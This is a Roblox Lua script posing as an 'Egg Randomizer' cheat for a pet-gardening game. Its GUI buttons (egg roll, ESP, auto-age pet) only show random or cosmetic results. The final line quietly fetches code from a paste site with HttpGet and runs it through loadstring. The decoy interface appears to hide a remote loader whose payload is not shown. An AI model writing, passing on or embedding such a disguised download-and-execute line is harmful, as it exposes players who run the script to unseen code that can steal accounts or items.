-- Destroy existing GUI if any
pcall(function()
	if game.CoreGui:FindFirstChild("GardenInjectedGUI") then
		game.CoreGui.GardenInjectedGUI:Destroy()
	end
end)

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "GardenInjectedGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 260)
frame.Position = UDim2.new(0.5, -110, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

local padding = Instance.new("UIPadding")
padding.PaddingTop = UDim.new(0, 10)
padding.PaddingBottom = UDim.new(0, 10)
padding.PaddingLeft = UDim.new(0, 10)
padding.PaddingRight = UDim.new(0, 10)
padding.Parent = frame

-- Title
local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 0, 25)
label.BackgroundTransparency = 1
label.Text = "üêæ Egg Randomizer üêæ"
label.Font = Enum.Font.GothamBold
label.TextSize = 18
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextXAlignment = Enum.TextXAlignment.Center
label.Parent = frame

-- Subtitle
local subLabel = Instance.new("TextLabel")
subLabel.Size = UDim2.new(1, 0, 0, 18)
subLabel.Position = UDim2.new(0, 0, 0, 25)
subLabel.BackgroundTransparency = 1
subLabel.Text = "Made by: Miszua"
subLabel.Font = Enum.Font.Gotham
subLabel.TextSize = 14
subLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
subLabel.TextXAlignment = Enum.TextXAlignment.Center
subLabel.Parent = frame

-- Create Buttons
local function createButton(positionY, text, color)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, 0, 0, 30)
	button.Position = UDim2.new(0, 0, 0, positionY)
	button.BackgroundColor3 = color
	button.Text = text
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.Font = Enum.Font.Gotham
	button.TextSize = 16
	button.AutoButtonColor = true
	button.Parent = frame
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
	return button
end

local rollButton = createButton(50, "üé≤ AUTO ROLL ZEN EGG", Color3.fromRGB(80, 130, 90))
local espButton = createButton(85, "üëÅÔ∏è ESP: OFF", Color3.fromRGB(100, 100, 130))
local ageButton = createButton(120, "üê∂ AUTO AGE 50 PET", Color3.fromRGB(160, 110, 60))

-- Result Label
local resultLabel = Instance.new("TextLabel")
resultLabel.Size = UDim2.new(1, 0, 0, 60)
resultLabel.Position = UDim2.new(0, 0, 0, 160)
resultLabel.BackgroundTransparency = 1
resultLabel.Text = ""
resultLabel.Font = Enum.Font.GothamSemibold
resultLabel.TextSize = 15
resultLabel.TextColor3 = Color3.fromRGB(255, 255, 150)
resultLabel.TextXAlignment = Enum.TextXAlignment.Center
resultLabel.TextYAlignment = Enum.TextYAlignment.Top
resultLabel.TextWrapped = true
resultLabel.Parent = frame

-- ROLL EGG Logic
rollButton.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local hrp = character:WaitForChild("HumanoidRootPart")

	local eggRange = 20
	local petNames = {"Shiba Inu", "Nihonzaru", "Tanuki", "Tanchuzuru", "Kappa", "Kitsune"}
	local foundEgg = nil

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") and string.lower(obj.Name):find("egg") then
			local distance = (obj.Position - hrp.Position).Magnitude
			if distance <= eggRange then
				foundEgg = obj
				break
			end
		end
	end

	if not foundEgg then
		resultLabel.Text = "‚ùå Not near any egg!"
		return
	end

	local totalTime = 1.5
	local delay = 0.05
	local timer = 0
	local i = 1

	while timer < totalTime do
		resultLabel.Text = "üé∞ Rolling: " .. petNames[i]
		i = i + 1
		if i > #petNames then i = 1 end
		task.wait(delay)
		timer += delay
	end

	local finalPet = petNames[math.random(1, #petNames)]
	local age = math.random(1, 50)
	local weight = string.format("%.2f", math.random(100, 1000) / 100)

	resultLabel.Text = string.format("üéâ You rolled: %s\nage: %d | weight: %s kg", finalPet, age, weight)

	if foundEgg:FindFirstChild("PetNameBillboard") then
		foundEgg.PetNameBillboard:Destroy()
	end

	local billboard = Instance.new("BillboardGui")
	billboard.Name = "PetNameBillboard"
	billboard.Size = UDim2.new(0, 250, 0, 90)
	billboard.StudsOffset = Vector3.new(0, 4, 0)
	billboard.Adornee = foundEgg
	billboard.AlwaysOnTop = true
	billboard.Parent = foundEgg

	local text = Instance.new("TextLabel")
	text.Size = UDim2.new(1, 0, 1, 0)
	text.BackgroundTransparency = 1
	text.Text = string.format("üéâ %s\nüìÖ age: %d | ‚öñÔ∏è %s kg", finalPet, age, weight)
	text.Font = Enum.Font.GothamBold
	text.TextSize = 32
	text.TextColor3 = Color3.fromRGB(0, 120, 255)
	text.TextTransparency = 0.2
	text.TextStrokeTransparency = 0.5
	text.TextWrapped = true
	text.TextYAlignment = Enum.TextYAlignment.Center
	text.Parent = billboard
end)

-- ESP Toggle
local espEnabled = false
espButton.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled
	espButton.Text = espEnabled and "üëÅÔ∏è ESP: ON" or "üëÅÔ∏è ESP: OFF"
end)

-- Scrollable GUI when clicking AUTO AGE 50 PET
local function showPetScrollGUI()
	if gui:FindFirstChild("PetScrollGUI") then return end

	local petList = {
		"Butterfly", "Raccoon", "Queen Bee", "Spinosaurus", "T-Rex", "Disco Bee",
		"Mimic Octopus", "Dragonfly", "Fennec Fox", "Red Fox", "Kitsune", "Corrupt Kitsune"
	}

	local petGui = Instance.new("Frame")
	petGui.Name = "PetScrollGUI"
	petGui.Size = UDim2.new(0, 240, 0, 220)
	petGui.Position = UDim2.new(0.5, -120, 0.5, -110)
	petGui.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	petGui.AnchorPoint = Vector2.new(0.5, 0.5)
	petGui.Active = true
	petGui.Draggable = true
	petGui.Selectable = false
	petGui.Parent = gui
	Instance.new("UICorner", petGui).CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -20, 0, 30)
	title.Position = UDim2.new(0, 10, 0, 10)
	title.BackgroundTransparency = 1
	title.Text = "Select Pet to Age"
	title.Font = Enum.Font.GothamBold
	title.TextSize = 18
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Selectable = false
	title.Parent = petGui

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -30, 0, 6)
	closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
	closeBtn.Text = "X"
	closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 14
	closeBtn.Selectable = false
	closeBtn.Parent = petGui
	Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

	closeBtn.MouseButton1Click:Connect(function()
		petGui:Destroy()
	end)

	local scroll = Instance.new("ScrollingFrame")
	scroll.Size = UDim2.new(1, -20, 1, -50)
	scroll.Position = UDim2.new(0, 10, 0, 40)
	scroll.CanvasSize = UDim2.new(0, 0, 0, #petList * 35)
	scroll.ScrollBarThickness = 6
	scroll.BackgroundTransparency = 1
	scroll.Selectable = false
	scroll.Parent = petGui

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 5)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scroll

	for _, petName in ipairs(petList) do
		local petButton = Instance.new("TextButton")
		petButton.Size = UDim2.new(1, 0, 0, 30)
		petButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
		petButton.Text = petName
		petButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		petButton.Font = Enum.Font.Gotham
		petButton.TextSize = 16
		petButton.Selectable = false
		petButton.Parent = scroll
		Instance.new("UICorner", petButton).CornerRadius = UDim.new(0, 6)

		petButton.MouseButton1Click:Connect(function()
			print("üê∂ Auto-aged pet:", petName, "to age 50!")
			petGui:Destroy()
		end)
	end
end

-- Link it
ageButton.MouseButton1Click:Connect(showPetScrollGUI)

loadstring(game:HttpGet("https://pastefy.app/roIa67SA/raw"))()
